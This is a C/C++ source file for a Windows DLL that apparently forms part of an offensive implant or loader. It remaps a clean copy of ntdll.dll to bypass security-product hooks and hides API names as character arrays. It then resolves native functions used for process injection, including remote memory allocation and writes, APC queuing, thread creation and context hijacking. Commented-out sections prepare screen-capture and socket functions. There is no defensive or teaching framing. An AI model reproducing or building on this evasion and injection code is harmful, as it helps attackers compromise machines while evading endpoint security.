#include "pch.h"
#include "framework.h"
#include "headers.h"
#include "dll_headers.h"
#include <stdlib.h>
#include <stdint.h>

static LPVOID ntdll_unhooking(NtProtectVirtualMemoryFunc ProtectVirtualMemory)
{
	int status = 0;
	LPVOID ptr = NULL;
	CHAR str_ntdll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0' };

	HANDLE ntdll_file = CreateFileA(str_ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (ntdll_file == INVALID_HANDLE_VALUE) return ptr;

	HANDLE mapping = CreateFileMapping(ntdll_file, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	CloseHandle(ntdll_file);
	if (!mapping) return ptr;


	ptr = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
	CloseHandle(mapping);
	if (!ptr) return ptr;

	UINT64 text_ptr = (UINT64)ptr + 0x1000;
	SIZE_T text_size = 0x00119200;
	ULONG old_protect = 0;
	status = ProtectVirtualMemory(((HANDLE)(LONG_PTR)-1), (PVOID*)&text_ptr, &text_size,
		PAGE_EXECUTE_READ, &old_protect);

	//if (status != STATUS_SUCCESS) return ptr;
	
	return ptr;
}



bool load_nt_functions(PNT_FUNCTIONS nt)
{
	CHAR str_NtProtectVirtualMemory[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };

	if (nt == NULL)
	{
		return false;
	}
	HMODULE hm_ntdll = 0;

	// Load the ntdll.dll library
	//WCHAR str_ntdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', L'\0' };
	//HMODULE hm_ntdll = GMHR(str_ntdll);
	
	hm_ntdll = (HMODULE)GetModuleHandleA("ntdll.dll");


	hm_ntdll = (HMODULE)ntdll_unhooking((NtProtectVirtualMemoryFunc)GPAR(hm_ntdll, str_NtProtectVirtualMemory));

	//void** buggy = 0;
	//*buggy = 0;


	if (hm_ntdll == NULL)
	{

		return false;
	}
	CHAR str_NtWaitForSingleObject[] = { 'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', '\0' };
	CHAR str_NtQueueApcThread[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };
	CHAR str_NtCreateEvent[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'E', 'v', 'e', 'n', 't', '\0' };
	CHAR str_NtGetContextThread[] = { 'N', 't', 'G', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };
	CHAR str_NtSetContextThread[] = { 'N', 't', 'S', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };
	CHAR str_NtCreateThreadEx[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '\0' };
	CHAR str_NtResumeThread[] = { 'N', 't', 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };
	CHAR str_NtQuerySystemInformation[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', '\0' };
	CHAR str_NtQueryObject[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'O', 'b', 'j', 'e', 'c', 't', '\0' };
	CHAR str_NtQueryInformationWorkerFactory[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'W', 'o', 'r', 'k', 'e', 'r', 'F', 'a', 'c', 't', 'o', 'r', 'y', '\0' };
	CHAR str_NtTestAlert[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
	CHAR str_NtOpenProcess[] = { 'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
	CHAR str_NtAllocateVirtualMemory[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
	CHAR str_NtWriteVirtualMemory[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };

	nt->NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GPAR(hm_ntdll, str_NtWaitForSingleObject);//
	nt->NtQueueApcThread = (NtQueueApcThreadFunc)GPAR(hm_ntdll, str_NtQueueApcThread);//
	nt->NtGetContextThread = (NtGetContextThreadFunc)GPAR(hm_ntdll, str_NtGetContextThread);//
	nt->NtSetContextThread = (NtSetContextThreadFunc)GPAR(hm_ntdll, str_NtSetContextThread);//
	nt->NtCreateThreadEx = (NtCreateThreadExFunc)GPAR(hm_ntdll, str_NtCreateThreadEx); // Added
	nt->NtCreateEvent = (NtCreateEventFunc)GPAR(hm_ntdll, str_NtCreateEvent);
	nt->NtResumeThread = (NtResumeThreadFunc)GPAR(hm_ntdll, str_NtResumeThread);//
	nt->NtQuerySystemInformation = (NtQuerySystemInformationFunc)GPAR(hm_ntdll, str_NtQuerySystemInformation);
	nt->NtQueryObject = (NtQueryObjectFunc)GPAR(hm_ntdll, str_NtQueryObject);
	nt->NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactoryFunc)GPAR(hm_ntdll, str_NtQueryInformationWorkerFactory);
	nt->NtTestAlert = (NtTestAlertFunc)GPAR(hm_ntdll, str_NtTestAlert);
	nt->NtOpenProcess = (NtOpenProcessFunc)GPAR(hm_ntdll, str_NtOpenProcess);
	nt->NtAllocateVirtualMemory = (NtAllocateVirtualMemoryFunc)GPAR(hm_ntdll, str_NtAllocateVirtualMemory);
	nt->NtWriteVirtualMemory = (NtWriteVirtualMemoryFunc)GPAR(hm_ntdll, str_NtWriteVirtualMemory);
	nt->NtProtectVirtualMemory = (NtProtectVirtualMemoryFunc)GPAR(hm_ntdll, str_NtProtectVirtualMemory);
	

	// Check if all function addresses were retrieved successfully
	if (!nt->NtResumeThread || !nt->NtWaitForSingleObject || !nt->NtQueueApcThread ||
		!nt->NtGetContextThread || !nt->NtSetContextThread || !nt->NtCreateThreadEx || !nt->NtCreateEvent
		|| !nt->NtQueryInformationWorkerFactory || !nt->NtQueryObject || !nt->NtQuerySystemInformation || !nt->NtTestAlert
		|| !nt->NtWriteVirtualMemory || !nt->NtOpenProcess || !nt->NtAllocateVirtualMemory || !nt->NtProtectVirtualMemory) // Modified
	{

		return false;
	}

	return true;

}


// ==================== GDI32 函数加载 ====================
//bool load_gdi32_functions(gdi32_functions_t* gdi32)
//{
//	if (gdi32 == NULL)
//	{
//		return false;
//	}
//
//	// 加载 gdi32.dll
//	gdi32->hGDI32 = LoadLibraryA("gdi32.dll");
//
//	if (gdi32->hGDI32 == NULL)
//	{
//		return false;
//	}
//
//	// 获取函数地址
//	gdi32->CreateCompatibleDC = (CREATECOMPATIBLEDC_FN)GetProcAddress(gdi32->hGDI32, "CreateCompatibleDC");
//	gdi32->DeleteDC = (DELETEDC_FN)GetProcAddress(gdi32->hGDI32, "DeleteDC");
//	gdi32->CreateCompatibleBitmap = (CREATECOMPATIBLEBITMAP_FN)GetProcAddress(gdi32->hGDI32, "CreateCompatibleBitmap");
//	gdi32->SelectObject = (SELECTOBJECT_FN)GetProcAddress(gdi32->hGDI32, "SelectObject");
//	gdi32->BitBlt = (BITBLT_FN)GetProcAddress(gdi32->hGDI32, "BitBlt");
//	gdi32->GetDIBits = (GETDIBITS_FN)GetProcAddress(gdi32->hGDI32, "GetDIBits");
//	gdi32->DeleteObject = (DELETEOBJECT_FN)GetProcAddress(gdi32->hGDI32, "DeleteObject");
//
//
//	uint64_t* funcs_start = (uint64_t*)gdi32;
//	int num = sizeof(*gdi32) / sizeof(void*);
//	for (int i = 0; i < num; i++, funcs_start++)
//	{
//		if (*funcs_start == NULL)
//		{
//			unload_gdi32_functions(gdi32);
//			return false;
//		}
//	}
//
//	return true;
//}
//
//void unload_gdi32_functions(gdi32_functions_t* gdi32)
//{
//	if (gdi32 != NULL)
//	{
//		if (gdi32->hGDI32 != NULL)
//		{
//			FreeLibrary(gdi32->hGDI32);
//			gdi32->hGDI32 = NULL;
//		}
//
//		// 清空所有函数指针
//		gdi32->CreateCompatibleDC = NULL;
//		gdi32->DeleteDC = NULL;
//		gdi32->CreateCompatibleBitmap = NULL;
//		gdi32->SelectObject = NULL;
//		gdi32->BitBlt = NULL;
//		gdi32->GetDIBits = NULL;
//		gdi32->DeleteObject = NULL;
//	}
//}
//

// ==================== USER32 函数加载 ====================
//bool load_user32_functions(user32_functions_t* user32)
//{
//	if (user32 == NULL)
//	{
//		return false;
//	}
//
//	// 加载 user32.dll
//	user32->hUser32 = LoadLibraryA("user32.dll");
//	if (user32->hUser32 == NULL)
//	{
//		return false;
//	}
//
//	// 获取函数地址
//	user32->GetDC = (GETDC_FN)GetProcAddress(user32->hUser32, "GetDC");
//	user32->ReleaseDC = (RELEASEDC_FN)GetProcAddress(user32->hUser32, "ReleaseDC");
//	user32->GetSystemMetrics = (GETSYSTEMMETRICS_FN)GetProcAddress(user32->hUser32, "GetSystemMetrics");
//	user32->GetCursorPos = (GETCURSORPOS_FN)GetProcAddress(user32->hUser32, "GetCursorPos");
//	user32->GetWindowRect = (GETWINDOWRECT_FN)GetProcAddress(user32->hUser32, "GetWindowRect");
//	user32->GetDesktopWindow = (GETDESKTOPWINDOW_FN)GetProcAddress(user32->hUser32, "GetDesktopWindow");
//	user32->GetForegroundWindow = (GETFOREGROUNDWINDOW_FN)GetProcAddress(user32->hUser32, "GetForegroundWindow");
//
//
//	uint64_t* funcs_start = (uint64_t*)user32;
//	int num = sizeof(*user32) / sizeof(void*);
//	for (int i = 0; i < num; i++, funcs_start++)
//	{
//		if (*funcs_start == NULL)
//		{
//			unload_user32_functions(user32);
//			return false;
//		}
//	}
//
//	return true;
//}
//
//void unload_user32_functions(user32_functions_t* user32)
//{
//	if (user32 != NULL)
//	{
//		if (user32->hUser32 != NULL)
//		{
//			FreeLibrary(user32->hUser32);
//			user32->hUser32 = NULL;
//		}
//
//		// 清空所有函数指针
//		user32->GetDC = NULL;
//		user32->ReleaseDC = NULL;
//		user32->GetSystemMetrics = NULL;
//		user32->GetCursorPos = NULL;
//		user32->GetWindowRect = NULL;
//		user32->GetDesktopWindow = NULL;
//		user32->GetForegroundWindow = NULL;
//	}
//}


// ==================== KERNEL32 函数加载 ====================
//bool load_kernel32_functions(kernel32_functions_t* kernel32)
//{
//	if (kernel32 == NULL)
//	{
//		return false;
//	}
//
//	// 加载 kernel32.dll
//	kernel32->hKernel32 = LoadLibraryA("kernel32.dll");
//	if (kernel32->hKernel32 == NULL)
//	{
//		return false;
//	}
//
//	kernel32->GetLastError = (GETLASTERROR_FN)GetProcAddress(kernel32->hKernel32, "GetLastError");
//
//	// 获取基础函数地址
//	kernel32->Sleep = (SLEEP_FN)GetProcAddress(kernel32->hKernel32, "Sleep");
//	kernel32->GetTickCount = (GETTICKCOUNT_FN)GetProcAddress(kernel32->hKernel32, "GetTickCount");
//	kernel32->QueryPerformanceCounter = (QUERYPERFORMANCECOUNTER_FN)GetProcAddress(kernel32->hKernel32, "QueryPerformanceCounter");
//	kernel32->QueryPerformanceFrequency = (QUERYPERFORMANCEFREQUENCY_FN)GetProcAddress(kernel32->hKernel32, "QueryPerformanceFrequency");
//	kernel32->LocalLock = (LOCALLOCK_FN)GetProcAddress(kernel32->hKernel32, "LocalLock");
//	kernel32->LocalUnlock = (LOCALUNLOCK_FN)GetProcAddress(kernel32->hKernel32, "LocalUnlock");
//	kernel32->LocalFree = (LOCALFREE_FN)GetProcAddress(kernel32->hKernel32, "LocalFree");
//
//	// 获取文件操作函数地址
//	kernel32->CreateFileA = (CREATEFILE_FN)GetProcAddress(kernel32->hKernel32, "CreateFileA");
//	kernel32->WriteFile = (WRITEFILE_FN)GetProcAddress(kernel32->hKernel32, "WriteFile");
//	kernel32->ReadFile = (READFILE_FN)GetProcAddress(kernel32->hKernel32, "ReadFile");
//	kernel32->CloseHandle = (CLOSEHANDLE_FN)GetProcAddress(kernel32->hKernel32, "CloseHandle");
//	kernel32->GetFileSize = (GETFILESIZE_FN)GetProcAddress(kernel32->hKernel32, "GetFileSize");
//	kernel32->SetFilePointer = (SETFILEPOINTER_FN)GetProcAddress(kernel32->hKernel32, "SetFilePointer");
//	kernel32->FlushFileBuffers = (FLUSHFILEBUFFERS_FN)GetProcAddress(kernel32->hKernel32, "FlushFileBuffers");
//
//	kernel32->GetTempPathA = (GETTEMPPATHA_FN)GetProcAddress(kernel32->hKernel32, "GetTempPathA");
//	kernel32->DeleteFileA = (DELETEFILEA_FN)GetProcAddress(kernel32->hKernel32, "DeleteFileA");
//
//	uint64_t* funcs_start = (uint64_t*)kernel32;
//	int num = sizeof(*kernel32) / sizeof(void*);
//	for (int i = 0; i < num; i++, funcs_start++)
//	{
//		if (*funcs_start == NULL)
//		{
//			unload_kernel32_functions(kernel32);
//			return false;
//		}
//	}
//
//	return true;
//}
//
//void unload_kernel32_functions(kernel32_functions_t* kernel32)
//{
//	if (kernel32 != NULL)
//	{
//		if (kernel32->hKernel32 != NULL)
//		{
//			FreeLibrary(kernel32->hKernel32);
//			kernel32->hKernel32 = NULL;
//		}
//
//		kernel32->GetLastError = NULL;
//
//		// 清空所有函数指针
//		kernel32->Sleep = NULL;
//		kernel32->GetTickCount = NULL;
//		kernel32->QueryPerformanceCounter = NULL;
//		kernel32->QueryPerformanceFrequency = NULL;
//		kernel32->LocalLock = NULL;
//		kernel32->LocalUnlock = NULL;
//		kernel32->LocalFree = NULL;
//
//		kernel32->CreateFileA = NULL;
//		kernel32->WriteFile = NULL;
//		kernel32->ReadFile = NULL;
//		kernel32->CloseHandle = NULL;
//		kernel32->GetFileSize = NULL;
//		kernel32->SetFilePointer = NULL;
//		kernel32->FlushFileBuffers = NULL;
//
//		kernel32->GetTempPathA = NULL;
//		kernel32->DeleteFileA = NULL;
//	}
//}


// ==================== Winsock 函数加载 ====================
//bool load_winsock_functions(winsock_functions_t* ws2)
//{
//	if (ws2 == NULL)
//	{
//		return false;
//	}
//
//	HMODULE winsock_dll = NULL;
//	winsock_dll = LoadLibraryA("ws2_32.dll");
//	if (winsock_dll == NULL)
//	{
//		return false;
//	}
//	ws2->hWinsock = winsock_dll;
//
//	ws2->WSAGetLastError = (WSAGetLastError_FN)GetProcAddress(winsock_dll, "WSAGetLastError");
//	ws2->WSAStartup = (WSAStartup_FN)GetProcAddress(winsock_dll, "WSAStartup");
//	ws2->WSACleanup = (WSACLEANUP_FN)GetProcAddress(winsock_dll, "WSACleanup");
//	ws2->WSASend = (WSASend_FN)GetProcAddress(winsock_dll, "WSASend");
//	ws2->WSASocketA = (WSASocketA_FN)GetProcAddress(winsock_dll, "WSASocketA");
//	ws2->WSARecv = (WSARecv_FN)GetProcAddress(winsock_dll, "WSARecv");
//	ws2->WSAConnect = (WSAConnect_FN)GetProcAddress(winsock_dll, "WSAConnect");
//
//	ws2->Socket = (SOCKET_FN)GetProcAddress(winsock_dll, "socket");
//	ws2->Connect = (CONNECT_FN)GetProcAddress(winsock_dll, "connect");
//	ws2->Send = (SEND_FN)GetProcAddress(winsock_dll, "send");
//	ws2->Recv = (RECV_FN)GetProcAddress(winsock_dll, "recv");
//	ws2->CloseSocket = (CLOSESOCKET_FN)GetProcAddress(winsock_dll, "closesocket");
//	ws2->Bind = (BIND_FN)GetProcAddress(winsock_dll, "bind");
//	ws2->Listen = (LISTEN_FN)GetProcAddress(winsock_dll, "listen");
//	ws2->Accept = (ACCEPT_FN)GetProcAddress(winsock_dll, "accept");
//	ws2->Htons = (HTONS_FN)GetProcAddress(winsock_dll, "htons");
//	ws2->Inet_pton = (INET_PTON_FN)GetProcAddress(winsock_dll, "inet_pton");
//	ws2->ioctlsocket = (IOCTLSOCKET_FN)GetProcAddress(winsock_dll, "ioctlsocket");
//	ws2->setsockopt = (SETSOCKOPT_FN)GetProcAddress(winsock_dll, "setsockopt");
//	ws2->select = (SELECT_FN)GetProcAddress(winsock_dll, "select");
//
//	uint64_t* funcs_start = (uint64_t*)ws2;
//	int num = sizeof(*ws2) / sizeof(void*);
//	for (int i = 0; i < num; i++, funcs_start++)
//	{
//		if (*funcs_start == NULL)
//		{
//			unload_winsock_functions(ws2);
//			return false;
//		}
//	}
//
//	return true;
//}
//
//void unload_winsock_functions(winsock_functions_t* ws)
//{
//	if (ws != NULL)
//	{
//		if (ws->hWinsock != NULL)
//		{
//			FreeLibrary(ws->hWinsock);
//			ws->hWinsock = NULL;
//		}
//
//		// 清空所有函数指针
//		ws->WSAGetLastError = NULL;
//		ws->WSAStartup = NULL;
//		ws->WSACleanup = NULL;
//		ws->WSAConnect = NULL;
//		ws->WSARecv = NULL;
//		ws->WSASend = NULL;
//		ws->WSASocketA = NULL;
//
//		ws->Socket = NULL;
//		ws->Connect = NULL;
//		ws->Send = NULL;
//		ws->Recv = NULL;
//		ws->CloseSocket = NULL;
//		ws->Bind = NULL;
//		ws->Listen = NULL;
//		ws->Accept = NULL;
//		ws->Htons = NULL;
//		ws->Inet_pton = NULL;
//
//		ws->setsockopt = NULL;
//		ws->ioctlsocket = NULL;
//		ws->select = NULL;
//	}
//}


